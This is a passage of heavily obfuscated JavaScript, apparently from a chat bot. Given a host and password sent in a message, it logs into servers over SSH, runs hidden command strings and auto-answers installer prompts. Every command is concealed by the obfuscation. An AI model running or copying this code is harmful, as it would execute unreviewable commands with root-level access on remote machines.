                            let _0x1e2a9f = -0x8f * -0x30 + -0x19ca + -0x83 * 0x2;
                            while (!![]) {
                                switch (_0x4ca954[_0x1e2a9f++]) {
                                case '0':
                                    _0x597068[_0xc4324a(0xef4)]()[_0xc4324a(0x3d3)](_0xc4324a(0x118e) + _0xc4324a(0x524) + _0xc4324a(0xb56) + _0xc4324a(0x445) + _0xc4324a(0xc4e) + _0xc4324a(0xf1e)) && await _0x3d31ca[_0xc4324a(0xbf8)]('\x0a');
                                    continue;
                                case '1':
                                    _0x597068[_0xc4324a(0xef4)]()[_0xc4324a(0x3d3)](_0xc4324a(0xefe)) && await _0x3d31ca[_0xc4324a(0xbf8)]('6\x0a');
                                    continue;
                                case '2':
                                    _0x597068[_0xc4324a(0xef4)]()[_0xc4324a(0x3d3)](_0xc4324a(0xfbf)) && await _0x3d31ca[_0xc4324a(0xbf8)]('y\x0a');
                                    continue;
                                case '3':
                                    await console[_0xc4324a(0xd16)](_0x597068[_0xc4324a(0xef4)]());
                                    continue;
                                case '4':
                                    _0x597068[_0xc4324a(0xef4)]()[_0xc4324a(0x3d3)](_0xc4324a(0x118e) + _0xc4324a(0x8d9) + _0xc4324a(0x269) + _0xc4324a(0x53d) + _0xc4324a(0x107a) + _0xc4324a(0xb3e)) && await _0x3d31ca[_0xc4324a(0xbf8)]('\x0a');
                                    continue;
                                }
                                break;
                            }
                        })[_0x2b99f0(0x553)]['on'](_0x2329ec[_0x2b99f0(0xd69)], _0x567485 => {
                            const _0x131438 = _0x2b99f0;
                            _0xedb653[_0x131438(0x105d)](_0x2329ec[_0x131438(0xdd1)](_0x2329ec[_0x131438(0xe37)], _0x567485));
                        });
                    });
                })['on'](_0x2a5309[_0x5d4417(0xcf8)], _0x32ee4e => {
                    const _0x213d73 = _0x5d4417;
                    _0xedb653[_0x213d73(0x105d)](_0x2a5309[_0x213d73(0x469)]);
                })[_0x5d4417(0x1091)](_0x29a57e);
            }
            break;
        case _0x2a5309[_0x5d4417(0xf21)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x317)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                if (!_0x156b97)
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x86c)](_0x1ac933, _0x2a5309[_0x5d4417(0x998)]));
                let _0x498780 = _0x156b97[_0x5d4417(0xc6c)]('|');
                if (_0x2a5309[_0x5d4417(0x4ed)](_0x498780[_0x5d4417(0xf65)], -0x1 * -0x2081 + -0x111b + 0x7f * -0x1f))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xf1f)](_0x1ac933, _0x2a5309[_0x5d4417(0x998)]));
                let _0xda1242 = ![];
                const _0x2497d8 = new Client(), _0x40b8ad = {
                        'host': _0x498780[0x245d + 0x2b * -0x75 + -0x10b6],
                        'port': '22',
                        'username': _0x2a5309[_0x5d4417(0x7ca)],
                        'password': _0x498780[0x5 * 0x5dd + -0x142 * 0xb + -0x2 * 0x7bd]
                    }, _0x21d0b6 = _0x2a5309[_0x5d4417(0x839)](_0x2a5309[_0x5d4417(0x1012)], _0x2a5309[_0x5d4417(0xcae)](getRandom, ''));
                let _0x5fa83f = _0x21d0b6;
                const _0x23bd4b = _0x498780[0xdd1 + -0x1b82 + -0x1 * -0xdb3], _0x49e44c = _0x498780[-0x297 * 0x7 + -0x1 * -0x2038 + -0xe14], _0x3d6c2d = _0x498780[-0x5 * -0x7ca + -0x1e * 0x137 + -0x27c], _0x5401f9 = '\x0a', _0x19adc7 = _0x5d4417(0xd9b) + _0x5d4417(0xeec) + _0x5d4417(0x47f) + _0x5d4417(0x2a4) + _0x5d4417(0x8e1);
                async function _0x3e709c() {
                    const _0xb73512 = _0x5d4417, _0x165921 = {
                            'REfXr': _0x2a5309[_0xb73512(0x1011)],
                            'QsJve': _0x2a5309[_0xb73512(0x4a8)],
                            'eTXci': _0x2a5309[_0xb73512(0x42a)],
                            'VjQyV': _0x2a5309[_0xb73512(0x46a)],
                            'RvCyg': _0x2a5309[_0xb73512(0x7d6)],
                            'NsJvb': _0x2a5309[_0xb73512(0xc3f)],
                            'AoPVC': _0x2a5309[_0xb73512(0x6da)],
                            'xouvq': _0x2a5309[_0xb73512(0x1062)],
                            'kRLHI': _0x2a5309[_0xb73512(0xde5)],
                            'XQBWc': _0x2a5309[_0xb73512(0xaff)],
                            'GfWdK': function (_0x56c889, _0x4332de) {
                                const _0x3936c8 = _0xb73512;
                                return _0x2a5309[_0x3936c8(0xe65)](_0x56c889, _0x4332de);
                            },
                            'VxSeI': _0x2a5309[_0xb73512(0x1170)],
                            'EaSjw': _0x2a5309[_0xb73512(0x222)],
                            'ZuEPx': _0x2a5309[_0xb73512(0xc8c)],
                            'FglUc': _0x2a5309[_0xb73512(0x4f1)],
                            'FfdmI': _0x2a5309[_0xb73512(0x778)]
                        };
                    _0x2497d8[_0xb73512(0xdd9)](_0x19adc7, (_0x11ff3b, _0x5d1036) => {
                        const _0x3cfea4 = _0xb73512, _0x6cdb72 = {
                                'BHmgr': _0x2a5309[_0x3cfea4(0xcdf)],
                                'wNDcw': _0x2a5309[_0x3cfea4(0x880)],
                                'CfjdQ': _0x2a5309[_0x3cfea4(0x11d5)],
                                'WCUJO': _0x2a5309[_0x3cfea4(0xd7f)],
                                'KtKRG': _0x2a5309[_0x3cfea4(0x96b)],
                                'YNfse': function (_0x34b155, _0x1328ce) {
                                    const _0x381b6d = _0x3cfea4;
                                    return _0x2a5309[_0x381b6d(0xc76)](_0x34b155, _0x1328ce);
                                },
                                'tBHMh': _0x2a5309[_0x3cfea4(0xa96)],
                                'TGHJW': _0x2a5309[_0x3cfea4(0x638)],
                                'MSuni': _0x2a5309[_0x3cfea4(0x4e9)],
                                'Nihwc': _0x2a5309[_0x3cfea4(0xd58)],
                                'SFXPP': _0x2a5309[_0x3cfea4(0x937)],
                                'oVhrd': _0x2a5309[_0x3cfea4(0x36b)]
                            };
                        if (_0x11ff3b)
                            throw _0x11ff3b;
                        _0x5d1036['on'](_0x2a5309[_0x3cfea4(0x222)], async (_0xed3da8, _0x4fdf0f) => {
                            const _0x33beb9 = _0x3cfea4, _0x32bc5e = {
                                    'AHUNM': _0x165921[_0x33beb9(0xde0)],
                                    'YtQgn': _0x165921[_0x33beb9(0x3e7)],
                                    'RUNGC': _0x165921[_0x33beb9(0x7cb)],
                                    'dmjTJ': _0x165921[_0x33beb9(0x216)],
                                    'uleuW': _0x165921[_0x33beb9(0x58e)],
                                    'ICgRS': _0x165921[_0x33beb9(0xc04)],
                                    'BiRzE': _0x165921[_0x33beb9(0x423)],
                                    'gLCDu': _0x165921[_0x33beb9(0x9c5)],
                                    'iWhBx': _0x165921[_0x33beb9(0xd29)],
                                    'ulgAh': _0x165921[_0x33beb9(0xccf)],
                                    'veLZx': function (_0x1990fa, _0x3cc925) {
                                        const _0x1b6a5d = _0x33beb9;
                                        return _0x165921[_0x1b6a5d(0x530)](_0x1990fa, _0x3cc925);
                                    },
                                    'mAtLu': _0x165921[_0x33beb9(0xd32)],
                                    'zIUuZ': _0x165921[_0x33beb9(0x574)],
                                    'LItrf': _0x165921[_0x33beb9(0x1073)]
                                };
                            _0x2497d8[_0x33beb9(0xdd9)](_0x165921[_0x33beb9(0x8b0)], async (_0x210f22, _0x1e9dda) => {
                                const _0x5cddf9 = _0x33beb9, _0x554b8e = {
                                        'sAhNt': _0x32bc5e[_0x5cddf9(0xb2a)],
                                        'DyxBH': _0x32bc5e[_0x5cddf9(0x63e)],
                                        'qoZZU': _0x32bc5e[_0x5cddf9(0xbd5)],
                                        'Ryqul': _0x32bc5e[_0x5cddf9(0x30f)],
                                        'QnhEp': _0x32bc5e[_0x5cddf9(0xe43)],
                                        'CwwaY': _0x32bc5e[_0x5cddf9(0x1165)],
                                        'Fcywy': _0x32bc5e[_0x5cddf9(0x9e4)],
                                        'DPOAF': _0x32bc5e[_0x5cddf9(0x8e2)],
                                        'HEXOx': _0x32bc5e[_0x5cddf9(0xbc9)],
                                        'iFKHg': _0x32bc5e[_0x5cddf9(0x334)],
                                        'GyLnz': function (_0x33e365, _0x222589) {
                                            const _0x37bda7 = _0x5cddf9;
                                            return _0x32bc5e[_0x37bda7(0x386)](_0x33e365, _0x222589);
                                        },
                                        'FxnwC': _0x32bc5e[_0x5cddf9(0x677)]
                                    };
                                if (_0x210f22)
                                    throw _0x210f22;
                                _0x1e9dda['on'](_0x32bc5e[_0x5cddf9(0xf87)], async (_0x4931b0, _0x1a4c35) => {
                                    const _0xb9614e = _0x5cddf9;
                                    let _0xcd2eb9 = _0xb9614e(0x2fd) + _0xb9614e(0xd67) + _0xb9614e(0x92a) + _0xb9614e(0x107c) + _0xb9614e(0xc4f) + _0xb9614e(0x10de) + _0xb9614e(0x8c1) + _0x5fa83f + (_0xb9614e(0x110b) + _0xb9614e(0x59a)) + _0x23bd4b + (_0xb9614e(0xa51) + _0xb9614e(0xee6) + _0xb9614e(0xb65) + _0xb9614e(0x195) + _0xb9614e(0x57b) + _0xb9614e(0x427) + _0xb9614e(0xe39) + _0xb9614e(0x311) + _0xb9614e(0x64c) + _0xb9614e(0x1a3) + _0xb9614e(0x93b) + _0xb9614e(0x11b8) + _0xb9614e(0xa3e) + _0xb9614e(0x9d7) + _0xb9614e(0x698) + _0xb9614e(0xb89) + _0xb9614e(0x5ee) + _0xb9614e(0x88a) + _0xb9614e(0x1a1));
                                    await _0x57ed02[_0xb9614e(0x367) + 'e'](_0xedb653[_0xb9614e(0x9e2)], { 'text': _0xcd2eb9 }, { 'quoted': _0xedb653 });
                                })['on'](_0x32bc5e[_0x5cddf9(0x730)], async _0x87f6d3 => {
                                    const _0x2fadb2 = _0x5cddf9, _0x531d3f = _0x554b8e[_0x2fadb2(0x220)][_0x2fadb2(0xc6c)]('|');
                                    let _0x2cd560 = 0x243 * -0x3 + 0x206a + -0x19a1;
                                    while (!![]) {
                                        switch (_0x531d3f[_0x2cd560++]) {
                                        case '0':
                                            _0x87f6d3[_0x2fadb2(0xef4)]()[_0x2fadb2(0x3d3)](_0x554b8e[_0x2fadb2(0xcd8)]) && _0x1e9dda[_0x2fadb2(0xbf8)]('1\x0a');
                                            continue;
                                        case '1':
                                            _0x87f6d3[_0x2fadb2(0xef4)]()[_0x2fadb2(0x3d3)](_0x554b8e[_0x2fadb2(0x575)]) && _0x1e9dda[_0x2fadb2(0xbf8)](_0x3d6c2d + '\x0a');
                                            continue;
                                        case '2':
                                            _0x87f6d3[_0x2fadb2(0xef4)]()[_0x2fadb2(0x3d3)](_0x554b8e[_0x2fadb2(0x3fc)]) && _0x1e9dda[_0x2fadb2(0xbf8)](_0x3d6c2d + '\x0a');
                                            continue;
                                        case '3':
                                            _0x87f6d3[_0x2fadb2(0xef4)]()[_0x2fadb2(0x3d3)](_0x554b8e[_0x2fadb2(0x64b)]) && _0x1e9dda[_0x2fadb2(0xbf8)](_0x554b8e[_0x2fadb2(0x210)]);
                                            continue;
                                        case '4':
                                            _0x87f6d3[_0x2fadb2(0xef4)]()[_0x2fadb2(0x3d3)](_0x554b8e[_0x2fadb2(0x775)]) && _0x1e9dda[_0x2fadb2(0xbf8)](_0x49e44c + '\x0a');
                                            continue;
                                        case '5':
                                            _0x87f6d3[_0x2fadb2(0xef4)]()[_0x2fadb2(0x3d3)](_0x554b8e[_0x2fadb2(0x345)]) && _0x1e9dda[_0x2fadb2(0xbf8)](_0x554b8e[_0x2fadb2(0xe8b)]);
                                            continue;
                                        case '6':
                                            _0x87f6d3[_0x2fadb2(0xef4)]()[_0x2fadb2(0x3d3)](_0x554b8e[_0x2fadb2(0x2d4)]) && _0x1e9dda[_0x2fadb2(0xbf8)](_0x554b8e[_0x2fadb2(0x210)]);
                                            continue;
                                        case '7':
                                            await console[_0x2fadb2(0xd16)](_0x87f6d3[_0x2fadb2(0xef4)]());
                                            continue;
                                        }
                                        break;
                                    }
                                })[_0x5cddf9(0x553)]['on'](_0x32bc5e[_0x5cddf9(0x730)], async _0x33fcd8 => {
                                    const _0x274e2e = _0x5cddf9;
                                    console[_0x274e2e(0xd16)](_0x554b8e[_0x274e2e(0x72e)](_0x554b8e[_0x274e2e(0x39e)], _0x33fcd8));
                                });
                            });
                        })['on'](_0x2a5309[_0x3cfea4(0xc8c)], async _0xba2026 => {
                            const _0x2fe535 = _0x3cfea4, _0x2e632c = _0x6cdb72[_0x2fe535(0x22a)][_0x2fe535(0xc6c)]('|');
                            let _0x109963 = 0x4e5 + 0x13e + -0x623;
                            while (!![]) {
                                switch (_0x2e632c[_0x109963++]) {
                                case '0':
                                    _0xba2026[_0x2fe535(0xef4)]()[_0x2fe535(0x3d3)](_0x6cdb72[_0x2fe535(0xd57)]) && _0x5d1036[_0x2fe535(0xbf8)](_0x49e44c + '\x0a');
                                    continue;
                                case '1':
                                    _0xba2026[_0x2fe535(0xef4)]()[_0x2fe535(0x3d3)](_0x6cdb72[_0x2fe535(0x101f)]) && _0x5d1036[_0x2fe535(0xbf8)]('y\x0a');
                                    continue;
                                case '2':
                                    _0xba2026[_0x2fe535(0xef4)]()[_0x2fe535(0x3d3)](_0x6cdb72[_0x2fe535(0xe38)]) && _0x5d1036[_0x2fe535(0xbf8)](_0x6cdb72[_0x2fe535(0x478)]);
                                    continue;
                                case '3':
                                    console[_0x2fe535(0xd16)](_0x6cdb72[_0x2fe535(0xac4)](_0x6cdb72[_0x2fe535(0x2f5)], _0xba2026[_0x2fe535(0xef4)]()));
                                    continue;
                                case '4':
                                    _0xba2026[_0x2fe535(0xef4)]()[_0x2fe535(0x3d3)](_0x6cdb72[_0x2fe535(0xd15)]) && _0x5d1036[_0x2fe535(0xbf8)](_0x6cdb72[_0x2fe535(0xebf)]);
                                    continue;
                                case '5':
                                    _0xba2026[_0x2fe535(0xef4)]()[_0x2fe535(0x3d3)](_0x6cdb72[_0x2fe535(0xb99)]) && _0x5d1036[_0x2fe535(0xbf8)]('1\x0a');
                                    continue;
                                case '6':
                                    _0xba2026[_0x2fe535(0xef4)]()[_0x2fe535(0x3d3)](_0x6cdb72[_0x2fe535(0xa7a)]) && _0x5d1036[_0x2fe535(0xbf8)](_0x2fe535(0x1c5));
                                    continue;
                                case '7':
                                    _0xba2026[_0x2fe535(0xef4)]()[_0x2fe535(0x3d3)](_0x6cdb72[_0x2fe535(0x38c)]) && _0x5d1036[_0x2fe535(0xbf8)](_0x23bd4b + '\x0a');
                                    continue;
                                }
                                break;
                            }
                        })[_0x3cfea4(0x553)]['on'](_0x2a5309[_0x3cfea4(0xc8c)], _0x597eab => {
                            const _0x8b5049 = _0x3cfea4;
                            console[_0x8b5049(0xd16)](_0x165921[_0x8b5049(0x530)](_0x165921[_0x8b5049(0x9db)], _0x597eab));
                        });
                    });
                }
                async function _0x80749c() {
                    const _0x4042a7 = _0x5d4417, _0x3db784 = {
                            'yFleY': function (_0x4e4151) {
                                const _0x4378e6 = _0x4f4e;
                                return _0x2a5309[_0x4378e6(0x11d8)](_0x4e4151);
                            },
                            'vjUmd': function (_0x108c04, _0x17fa85) {
                                const _0x1b8756 = _0x4f4e;
                                return _0x2a5309[_0x1b8756(0x6d1)](_0x108c04, _0x17fa85);
                            },
                            'ekEPi': _0x2a5309[_0x4042a7(0x778)]
                        };
                    _0x2497d8[_0x4042a7(0xdd9)](_0x19adc7, (_0x2e6745, _0xcba1cf) => {
                        const _0x2ea9ff = _0x4042a7, _0x657c90 = {
                                'NojPQ': _0x2a5309[_0x2ea9ff(0x10d0)],
                                'IMRoh': _0x2a5309[_0x2ea9ff(0x3d8)],
                                'cZPWG': _0x2a5309[_0x2ea9ff(0x4e9)],
                                'NbWSs': _0x2a5309[_0x2ea9ff(0x790)],
                                'cdToQ': _0x2a5309[_0x2ea9ff(0x11d5)],
                                'ofmjd': _0x2a5309[_0x2ea9ff(0x23c)],
                                'LJaMk': _0x2a5309[_0x2ea9ff(0x11a9)],
                                'dbdBs': _0x2a5309[_0x2ea9ff(0x7b4)],
                                'FUbUZ': _0x2a5309[_0x2ea9ff(0x8af)],
                                'CFIzq': _0x2a5309[_0x2ea9ff(0x898)],
                                'eqrSa': _0x2a5309[_0x2ea9ff(0xd58)],
                                'OUNSN': _0x2a5309[_0x2ea9ff(0xb09)],
                                'IJDMb': _0x2a5309[_0x2ea9ff(0xf80)],
                                'EOKqx': _0x2a5309[_0x2ea9ff(0x7e7)],
                                'XzIgw': _0x2a5309[_0x2ea9ff(0x96b)],
                                'xzokd': _0x2a5309[_0x2ea9ff(0x27e)],
                                'jqwfZ': _0x2a5309[_0x2ea9ff(0xe12)],
                                'DpSWh': _0x2a5309[_0x2ea9ff(0x102a)],
                                'hnGPv': _0x2a5309[_0x2ea9ff(0x10c0)],
                                'fFHDU': _0x2a5309[_0x2ea9ff(0xfa5)],
                                'TTDKf': _0x2a5309[_0x2ea9ff(0xc83)],
                                'YsRsC': _0x2a5309[_0x2ea9ff(0xfdd)],
                                'EKjzo': function (_0x5ba003, _0x31a828) {
                                    const _0x5e12ce = _0x2ea9ff;
                                    return _0x2a5309[_0x5e12ce(0x2de)](_0x5ba003, _0x31a828);
                                },
                                'qecpI': _0x2a5309[_0x2ea9ff(0xa96)],
                                'pPzhd': _0x2a5309[_0x2ea9ff(0x966)],
                                'PmacK': _0x2a5309[_0x2ea9ff(0x1179)],
                                'tFEXl': _0x2a5309[_0x2ea9ff(0x7fe)],
                                'jkeAy': _0x2a5309[_0x2ea9ff(0x7ee)],
                                'PMCCq': _0x2a5309[_0x2ea9ff(0x5be)]
                            };
                        if (_0x2e6745)
                            throw _0x2e6745;
                        _0xcba1cf['on'](_0x2a5309[_0x2ea9ff(0x222)], async (_0x4534c9, _0x182c52) => {
                            const _0x20e337 = _0x2ea9ff;
                            await _0x3db784[_0x20e337(0x10ee)](_0x3e709c);
                        })['on'](_0x2a5309[_0x2ea9ff(0xc8c)], async _0x3b3123 => {
                            const _0xc4305b = _0x2ea9ff, _0x32dba1 = _0x657c90[_0xc4305b(0xda9)][_0xc4305b(0xc6c)]('|');
                            let _0x39be59 = 0x13 * 0xb5 + 0x2a7 * 0x1 + -0x1016;
                            while (!![]) {
                                switch (_0x32dba1[_0x39be59++]) {
                                case '0':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xe10)]) && _0xcba1cf[_0xc4305b(0xbf8)](_0x657c90[_0xc4305b(0xaef)]);
                                    continue;
                                case '1':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0x7fa)]) && _0xcba1cf[_0xc4305b(0xbf8)](_0x23bd4b + '\x0a');
                                    continue;
                                case '2':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xe0f)]) && _0xcba1cf[_0xc4305b(0xbf8)]('y\x0a');
                                    continue;
                                case '3':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0x9da)]) && _0xcba1cf[_0xc4305b(0xbf8)]('y\x0a');
                                    continue;
                                case '4':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0x5d0)]) && _0xcba1cf[_0xc4305b(0xbf8)](_0x657c90[_0xc4305b(0xaef)]);
                                    continue;
                                case '5':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xabe)]) && _0xcba1cf[_0xc4305b(0xbf8)](_0x5fa83f + '\x0a');
                                    continue;
                                case '6':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0x91b)]) && _0xcba1cf[_0xc4305b(0xbf8)]('y\x0a');
                                    continue;
                                case '7':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xa98)]) && _0xcba1cf[_0xc4305b(0xbf8)]('y\x0a');
                                    continue;
                                case '8':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xdcf)]) && _0xcba1cf[_0xc4305b(0xbf8)]('0\x0a');
                                    continue;
                                case '9':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xa90)]) && _0xcba1cf[_0xc4305b(0xbf8)](_0x657c90[_0xc4305b(0xaef)]);
                                    continue;
                                case '10':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0x105b)]) && _0xcba1cf[_0xc4305b(0xbf8)]('y\x0a');
                                    continue;
                                case '11':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0x432)]) && _0xcba1cf[_0xc4305b(0xbf8)](_0x657c90[_0xc4305b(0xcce)]);
                                    continue;
                                case '12':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xe4b)]) && _0xcba1cf[_0xc4305b(0xbf8)]('y\x0a');
                                    continue;
                                case '13':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0x31c)]) && _0xcba1cf[_0xc4305b(0xbf8)]('A\x0a');
                                    continue;
                                case '14':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xbce)]) && _0xcba1cf[_0xc4305b(0xbf8)]('y\x0a');
                                    continue;
                                case '15':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xb08)]) && _0xcba1cf[_0xc4305b(0xbf8)]('1\x0a');
                                    continue;
                                case '16':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0x588)]) && _0xcba1cf[_0xc4305b(0xbf8)](_0x657c90[_0xc4305b(0xaef)]);
                                    continue;
                                case '17':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xca8)]) && _0xcba1cf[_0xc4305b(0xbf8)](_0x657c90[_0xc4305b(0xffb)]);
                                    continue;
                                case '18':
                                    console[_0xc4305b(0xd16)](_0x657c90[_0xc4305b(0x4eb)](_0x657c90[_0xc4305b(0xd70)], _0x3b3123[_0xc4305b(0xef4)]()));
                                    continue;
                                case '19':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xf86)]) && _0xcba1cf[_0xc4305b(0xbf8)](_0x657c90[_0xc4305b(0xaef)]);
                                    continue;
                                case '20':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xf4e)]) && _0xcba1cf[_0xc4305b(0xbf8)](_0x657c90[_0xc4305b(0xcce)]);
                                    continue;
                                case '21':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xc21)]) && _0xcba1cf[_0xc4305b(0xbf8)]('\x0a');
                                    continue;
                                case '22':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0x81c)]) && _0xcba1cf[_0xc4305b(0xbf8)]('y\x0a');
                                    continue;
                                case '23':
                                    _0x3b3123[_0xc4305b(0xef4)]()[_0xc4305b(0x3d3)](_0x657c90[_0xc4305b(0xa55)]) && _0xcba1cf[_0xc4305b(0xbf8)]('y\x0a');
                                    continue;
                                }
                                break;
                            }
                        })[_0x2ea9ff(0x553)]['on'](_0x2a5309[_0x2ea9ff(0xc8c)], _0x16a120 => {
                            const _0x2b8ed4 = _0x2ea9ff;
                            console[_0x2b8ed4(0xd16)](_0x3db784[_0x2b8ed4(0xf69)](_0x3db784[_0x2b8ed4(0xdaf)], _0x16a120));
                        });
                    });
                }
                _0x2497d8['on'](_0x2a5309[_0x5d4417(0x186)], async () => {
                    const _0x34dfe7 = _0x5d4417, _0x1130de = {
                            'RUhwt': function (_0xcff2c, _0x45df69) {
                                const _0x42a06f = _0x4f4e;
                                return _0x2a5309[_0x42a06f(0x1048)](_0xcff2c, _0x45df69);
                            },
                            'zNDEs': _0x2a5309[_0x34dfe7(0x1170)]
                        };
                    await _0xedb653[_0x34dfe7(0x105d)](_0x2a5309[_0x34dfe7(0xc91)]), _0x2497d8[_0x34dfe7(0xdd9)](_0x5401f9, async (_0x3d424c, _0x1115ff) => {
                        const _0x41e32a = _0x34dfe7, _0x2fd07a = {
                                'DesNu': function (_0x451001) {
                                    const _0x4e7a39 = _0x4f4e;
                                    return _0x2a5309[_0x4e7a39(0x11d8)](_0x451001);
                                }
                            };
                        if (_0x3d424c)
                            throw _0x3d424c;
                        _0x1115ff['on'](_0x2a5309[_0x41e32a(0x222)], async (_0xeee2be, _0x202418) => {
                            const _0x4f665f = _0x41e32a;
                            await _0x2fd07a[_0x4f665f(0xcac)](_0x80749c);
                        })['on'](_0x2a5309[_0x41e32a(0xc8c)], async _0xcf88c3 => {
                            const _0x391a26 = _0x41e32a;
                            await _0x1115ff[_0x391a26(0xbf8)]('\x09'), await _0x1115ff[_0x391a26(0xbf8)]('\x0a'), await console[_0x391a26(0xd16)](_0xcf88c3[_0x391a26(0xef4)]());
                        })[_0x41e32a(0x553)]['on'](_0x2a5309[_0x41e32a(0xc8c)], async _0x4a2be7 => {
                            const _0x4acda1 = _0x41e32a;
                            console[_0x4acda1(0xd16)](_0x1130de[_0x4acda1(0x61d)](_0x1130de[_0x4acda1(0xd38)], _0x4a2be7));
                        });
                    });
                })[_0x5d4417(0x1091)](_0x40b8ad);
            }
            break;
        case _0x2a5309[_0x5d4417(0xb7f)]:
        case _0x2a5309[_0x5d4417(0x4cf)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0xd3d)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                let _0x25c6b0 = _0x156b97[_0x5d4417(0xc6c)]('|');
                if (_0x2a5309[_0x5d4417(0x1108)](_0x25c6b0[_0x5d4417(0xf65)], 0x1256 + 0x3b * 0x53 + -0x2574))
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0xc50)](_0x1ac933, _0x2a5309[_0x5d4417(0xc9f)]));
                let _0x2133e3 = _0x25c6b0[0x7e7 + -0x1285 + 0xa9e], _0x342af5 = _0x25c6b0[0xf74 + -0x171a * -0x1 + -0x268d], _0x15eb75 = _0x25c6b0[0x194e + 0x8b9 * -0x1 + -0x1093];
                const _0x2e040c = {
                        'host': _0x2133e3,
                        'port': '22',
                        'username': _0x2a5309[_0x5d4417(0x7ca)],
                        'password': _0x342af5
                    }, _0x49595d = _0x15eb75 + (_0x5d4417(0x9a7) + _0x5d4417(0x107f) + _0x5d4417(0xcef)), _0x3d5e9b = new Client();
                _0x3d5e9b['on'](_0x2a5309[_0x5d4417(0x186)], () => {
                    const _0xeb8df5 = _0x5d4417, _0x3eee3 = {
                            'dtWZh': _0x2a5309[_0xeb8df5(0x492)],
                            'pykVi': _0x2a5309[_0xeb8df5(0xc9c)],
                            'gLFmD': function (_0x43c53f, _0x115224) {
                                const _0x45bbb2 = _0xeb8df5;
                                return _0x2a5309[_0x45bbb2(0x2de)](_0x43c53f, _0x115224);
                            },
                            'wgHPm': _0x2a5309[_0xeb8df5(0x778)]
                        };
                    _0x3d5e9b[_0xeb8df5(0xdd9)](_0x49595d, (_0x478519, _0x51f9d2) => {
                        const _0x15fd51 = _0xeb8df5;
                        if (_0x478519)
                            throw _0x478519;
                        _0x51f9d2['on'](_0x2a5309[_0x15fd51(0x222)], async (_0x56b75e, _0x2dd81c) => {
                            const _0x3473d3 = _0x15fd51;
                            await _0xedb653[_0x3473d3(0x105d)](_0x3eee3[_0x3473d3(0xa66)]), _0x3d5e9b[_0x3473d3(0x825)]();
                        })['on'](_0x2a5309[_0x15fd51(0xc8c)], async _0x181002 => {
                            const _0x5a73d1 = _0x15fd51;
                            await console[_0x5a73d1(0xd16)](_0x181002[_0x5a73d1(0xef4)]());
                        })[_0x15fd51(0x553)]['on'](_0x2a5309[_0x15fd51(0xc8c)], _0x5ea57d => {
                            const _0x370f01 = _0x15fd51;
                            _0x51f9d2[_0x370f01(0xbf8)]('y\x0a'), _0x51f9d2[_0x370f01(0xbf8)](_0x3eee3[_0x370f01(0xdbe)]), _0xedb653[_0x370f01(0x105d)](_0x3eee3[_0x370f01(0x62a)](_0x3eee3[_0x370f01(0x1050)], _0x5ea57d));
                        });
                    });
                })['on'](_0x2a5309[_0x5d4417(0xcf8)], _0x1b8f35 => {
                    const _0x173385 = _0x5d4417;
                    console[_0x173385(0xd16)](_0x2a5309[_0x173385(0xb51)](_0x2a5309[_0x173385(0xc71)], _0x1b8f35)), _0xedb653[_0x173385(0x105d)](_0x2a5309[_0x173385(0x469)]);
                })[_0x5d4417(0x1091)](_0x2e040c);
            }
            break;
        case _0x2a5309[_0x5d4417(0x57c)]:
        case _0x2a5309[_0x5d4417(0x1028)]: {
                if (!_0x47f98c)
                    return _0x2a5309[_0x5d4417(0x384)](_0x458b9f, mess[_0x5d4417(0x41d)]);
                let _0x39ee63 = _0x156b97[_0x5d4417(0xc6c)]('|');
                if (_0x2a5309[_0x5d4417(0x11ba)](_0x39ee63[_0x5d4417(0xf65)], 0x7 * 0x503 + 0x13e * 0x1a + -0x435f))
